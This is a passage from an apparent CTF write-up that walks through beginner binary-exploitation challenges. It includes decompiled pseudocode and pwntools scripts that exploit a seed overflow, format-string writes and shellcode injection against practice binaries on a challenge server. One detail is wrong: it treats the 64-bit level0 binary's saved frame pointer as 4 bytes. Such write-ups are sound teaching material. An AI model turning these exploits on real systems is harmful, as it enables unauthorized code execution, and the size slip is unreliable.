class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to a guess number game!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please let me know your name!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name:&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(&amp;v9);</span><br><span class="line">  v4 = (<span class="keyword">const</span> <span class="keyword">char</span> *)seed[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">srand</span>(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">rand</span>() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------------Turn:%d-------------\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your guess number:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v6);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;---------------------------------&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v6 != v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;GG!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v4 = <span class="string">&quot;Success!&quot;</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sub_C3E</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Still needs to overwrite (input <code>v9</code> to overwrite <code>seed</code>). </p>
<pre><code>char v9; // [rsp+10h] [rbp-30h]
unsigned int seed[2]; // [rsp+30h] [rbp-10h]
</code></pre>
<p>The offset seems to be <code>30h-10h</code> &#x3D;&#x3D; <code>32</code>.</p>
<p>The <code>rand</code> is another challenge. With the same <code>seed</code> for <code>srand()</code>, you will get same results of <code>rand()</code>. So we set <code>seed</code> to be <code>0</code> and test the rands:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ cat rand.c</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">srand</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">9</span>;i++)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">rand</span>() % <span class="number">6</span> + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ gcc rand.c</span><br><span class="line">$ ./a.out</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>Exploit:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="number">44772</span>)</span><br><span class="line">sh = process(<span class="string">&quot;./guess_num&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># Your name:</span></span><br><span class="line">sh.sendline(<span class="string">&quot;a&quot;</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># Turn:1</span></span><br><span class="line">sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># Turn:2</span></span><br><span class="line">sh.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># Turn:3</span></span><br><span class="line">sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># Turn:4</span></span><br><span class="line">sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># Turn:5</span></span><br><span class="line">sh.sendline(<span class="string">&quot;6&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># Turn:6</span></span><br><span class="line">sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># Turn:7</span></span><br><span class="line">sh.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># Turn:8</span></span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># Turn:9</span></span><br><span class="line">sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># Turn:10</span></span><br><span class="line">sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># flag</span></span><br></pre></td></tr></table></figure>
<h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>Attachment: <a href="/filehost/apeaw/CGfsb">CGfsb</a><br>Description: Caiji is worried about printf, he doesn’t know what printf does besides output.</p>
<p>Check:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ file CGfsb</span><br><span class="line">CGfsb: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=113a10b953bc39c6e182c4ce6e05582ba2f8017a, not stripped</span><br><span class="line">$ checksec CGfsb</span><br><span class="line">[*] <span class="string">&#x27;/root/CGfsb&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+1Eh] [ebp-7Eh]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+22h] [ebp-7Ah]</span></span><br><span class="line">  __int16 v6; <span class="comment">// [esp+26h] [ebp-76h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+28h] [ebp-74h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+8Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdin, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setbuf</span>(stderr, <span class="number">0</span>);</span><br><span class="line">  buf = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please tell me your name:&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0xA</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;leave your message please:&quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(&amp;s, <span class="number">100</span>, stdin);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello %s&quot;</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;your message is:&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( pwnme == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you pwned me, here is your flag:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// pwnme</span></span><br><span class="line">.bss:<span class="number">0804</span>A068 pwnme           dd ?                    ; DATA XREF: main+<span class="number">105</span>↑r</span><br><span class="line">.bss:<span class="number">0804</span>A068 _bss            ends</span><br></pre></td></tr></table></figure>
<p>The <code>printf(&amp;s)</code> is a typical <a href="/2020/07/05/2020-07-05-Format-String-Vulnerability-Intro/">format string vulnerability</a>, which leads to leak and write things anywhere. Our aim is to set <code>pwnme</code> as 8.<br>First determine the offset using:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = p32(<span class="number">0x0804A068</span>)+<span class="string">&#x27;aaaa&#x27;</span>+<span class="string">&#x27;1.%p,2.%p,3.%p,4.%p,5.%p,6.%p,7.%p,8.%p,9.%p,10.%p,11.%p,12.%p,13.%p,14.%p,15.%p&#x27;</span></span><br></pre></td></tr></table></figure>
<p>Result:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">h\xa0\x04aaaa1.0xff97b88e,2.0xf7ed6580,3.0x1,4.(nil),5.0x1,6.0xf7f14940,7.0x616e0001,8.0xa656d,9.(nil),10.0x804a068,11.0x61616161,12.0x70252e31,13.0x252e322c,14.0x2e332c70,15.0x342c7025</span><br></pre></td></tr></table></figure>
<p>11th parameter is <code>aaaa</code>, so <code>0x0804A068</code> is 10th.</p>
<p>Exploit:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./CGfsb&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;220.249.52.133&quot;</span>,<span class="string">&quot;40737&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x0804A068</span>:<span class="number">0x08</span>&#125;)</span><br><span class="line"><span class="comment">#payload = p32(0x0804A068)+&#x27;aaaa&#x27;+&#x27;%10$n&#x27;</span></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>Attachment: <a href="/filehost/apeaw/string">string</a><br>Description: Caiji meets Dragon, there is a wizard who can help him escape the danger, but it seems that some requirements are needed.</p>
<p>Check:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ file string</span><br><span class="line">string: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=4f9fd3e83d275c6555ec7059823616ffc2f1af1b, stripped</span><br><span class="line">$ checksec string</span><br><span class="line">[*] <span class="string">&#x27;/root/string&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">--------------------------------- <span class="function">main</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// ST18_8</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">alarm</span>(<span class="number">0x3C</span>u);</span><br><span class="line">  <span class="built_in">sub_400996</span>(<span class="number">60LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">8uLL</span>);</span><br><span class="line">  v4 = (__int64)v3;</span><br><span class="line">  *v3 = <span class="number">68</span>;</span><br><span class="line">  v3[<span class="number">1</span>] = <span class="number">85</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;we will tell you two secret ...&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;secret[0] is %x\n&quot;</span>, v4, a2);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;secret[1] is %x\n&quot;</span>, v4 + <span class="number">4</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;do not tell anyone &quot;</span>);</span><br><span class="line">  <span class="built_in">sub_400D72</span>(v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The End.....Really?&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------- <span class="function">sub_400D72</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_400D72</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What should your character&#x27;s name be:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(&amp;s) &lt;= <span class="number">0xC</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Creating a new player.&quot;</span>);</span><br><span class="line">    <span class="built_in">sub_400A7D</span>();</span><br><span class="line">    <span class="built_in">sub_400BB9</span>();</span><br><span class="line">    <span class="built_in">sub_400CA6</span>((_DWORD *)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hei! What&#x27;s up!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------- <span class="function">sub_400A7D</span></span><br><span class="line"><span class="function">choose go <span class="title">east</span> <span class="params">(to the following)</span> <span class="keyword">or</span> go <span class="title">up</span> <span class="params">(into the game circle)</span></span></span><br><span class="line"><span class="function">--------------------------------- sub_400BB9</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_400BB9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-7Ch]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-78h]</span></span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [rsp+10h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v2 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You travel a short distance east.That&#x27;s odd, anyone disappear suddenly&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;, what happend?! You just travel , and find another hole&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;go into there(1), or leave(0)?:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;A voice heard in your mind&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&#x27;Give me an address&#x27;&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And, you wish is:&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;format);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Your wish is&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;format, &amp;format);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I hear it, I hear it....&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------- <span class="function">sub_400CA6</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_400CA6</span><span class="params">(_DWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v1; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Dragon say: HaHa! you were supposed to have a normal&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;RPG game, but I have changed it! you have no weapon and &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;skill! you could not defeat me !&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s sound terrible! you meet final boss!but you level is ONE!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *a1 == a1[<span class="number">1</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>);</span><br><span class="line">    v1 = <span class="built_in">mmap</span>(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">33</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, v1, <span class="number">0x100</span>uLL);</span><br><span class="line">    ((<span class="built_in"><span class="keyword">void</span></span> (__fastcall *)(_QWORD, <span class="keyword">void</span> *))v1)(<span class="number">0LL</span>, v1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>We need <code>((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</code> in <code>sub_400CA6()</code> to execute shellcodes, so <code>*a1 == a1[1]</code> needs to be true.<br>The <code>a1</code> in <code>sub_400CA6()</code> comes from <code>a1</code> in <code>sub_400D72()</code>, which is from the argument <code>v4</code> passed by <code>main()</code>. As <code>v4</code> is an alias for <code>v3</code>, we need to make <code>v3[0] == v3[1]</code>.</p>
<p>Vulnerability appears at <code>printf(&amp;format, &amp;format);</code> in <code>sub_400BB9()</code> which enables us to read and write. So we use it to overwrite <code>v3[0]</code> (or <code>v3[1]</code>).</p>
<p>Because in <code>main</code> it use <code>printf(&quot;secret[0] is %x\n&quot;, v4, a2);</code> and <code>printf(&quot;secret[1] is %x\n&quot;, v4 + 4);</code> to leak <code>v4</code> address, we can directly use it to exploit (don’t forget to check the offset):</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./string&#x27;</span>)</span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">42236</span>)<span class="comment"># 220.249.52.133:42236</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;secret[0] is &quot;</span>)</span><br><span class="line">secret_addr = <span class="built_in">int</span>(sh.recvline()[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(secret_addr)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># What should your character&#x27;s name be:</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># So, where you will go?east or up?:</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;east&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># go into there(1), or leave(0)?:</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># &#x27;Give me an address&#x27;</span></span><br><span class="line">sh.sendline(<span class="built_in">str</span>(secret_addr))</span><br><span class="line"><span class="built_in">print</span> sh.recv() <span class="comment"># And, you wish is:</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">85</span> + <span class="string">&#x27;%7$n&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(asm(shellcraft.sh()))   <span class="comment"># create shellcode in pwntools</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="ROP-Part"><a href="#ROP-Part" class="headerlink" title="ROP Part"></a>ROP Part</h1><p>This part is for <code>ret2xxx</code>, aka <code>ROP</code> (return oriented programming) challenges, and they are really basic challenges. </p>
<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>Attachment: <a href="/filehost/apeaw/level0">level0</a><br>Description: Caiji understands what overflow is, he believes he can get a shell.</p>
<p>Check:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ file level0</span><br><span class="line">level0: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=8dc0b3ec5a7b489e61a71bc1afa7974135b0d3d4, not stripped</span><br><span class="line">$ checksec level0</span><br><span class="line">[*] <span class="string">&#x27;/root/level0&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>Pseudocode:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">--------------------------------- <span class="function">main </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xD</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">vulnerable_function</span>();</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------- <span class="function">vulnerable_function</span></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------- callsystem   -- <span class="function"><span class="keyword">not</span> in the main logic</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">callsystem</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------- assembly &amp; address of callsystem</span><br><span class="line">.text:<span class="number">0000000000400596</span>     <span class="keyword">public</span> callsystem</span><br><span class="line">.text:<span class="number">0000000000400596</span>     callsystem proc near</span><br><span class="line">.text:<span class="number">0000000000400596</span>     ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000400596</span> <span class="number">000</span> push    rbp</span><br><span class="line">.text:<span class="number">0000000000400597</span> <span class="number">008</span> mov     rbp, rsp</span><br><span class="line">.text:<span class="number">000000000040059</span>A <span class="number">008</span> mov     edi, offset command ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">000000000040059F</span> <span class="number">008</span> call    _system</span><br><span class="line">.text:<span class="number">00000000004005</span>A4 <span class="number">008</span> pop     rbp</span><br><span class="line">.text:<span class="number">00000000004005</span>A5 <span class="number">000</span> retn</span><br><span class="line">.text:<span class="number">00000000004005</span>A5     ; &#125; <span class="comment">// starts at 400596</span></span><br><span class="line">.text:<span class="number">00000000004005</span>A5     callsystem endp</span><br></pre></td></tr></table></figure>
<p>The vulnerability exists in <code>vulnerable_function</code>, because <code>buf</code> can only store <code>0x80</code> on the stack but it reads <code>0x200</code>. Things on the stack:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">           +-----------------+&lt;---high address</span><br><span class="line">           |     retaddr     |</span><br><span class="line">           +-----------------+</span><br><span class="line">           |     saved ebp   |</span><br><span class="line">    ebp---&gt;+-----------------+</span><br><span class="line">           |                 |</span><br><span class="line">           |                 |</span><br><span class="line">           |       buf       |</span><br><span class="line">           |                 |</span><br><span class="line">           |                 |</span><br><span class="line">           |                 |</span><br><span class="line">ebp-0x80--&gt;+-----------------+&lt;---low address</span><br></pre></td></tr></table></figure>
<p>We write data from low to high address. If we write too much, we will overwrite <code>saved ebp</code>, even the <code>retaddr</code> (when a function returns, it will return to the <code>retaddr</code> in its stack frame).<br>Therefore controlling <code>retaddr</code> means controlling where program goes later. It is the first step of <code>ROP</code> (return oriented programming). <code>ROP</code> means using instruction gadgets with a <code>ret</code> at the end, to control the program flow.</p>
<p>Our goal is to call <code>callsystem</code> to get shell, so we can overwrite <code>retaddr</code> as the address(<code>0x400596</code>) of <code>callsystem</code>. we have to input <code>0x80</code> chars as padding to cover <code>buf</code>, and 4 chars&#x2F;bytes (32-bit) to cover <code>ebp</code>, then rest of the chars will write to <code>retaddr</code>. It should be like:</p>
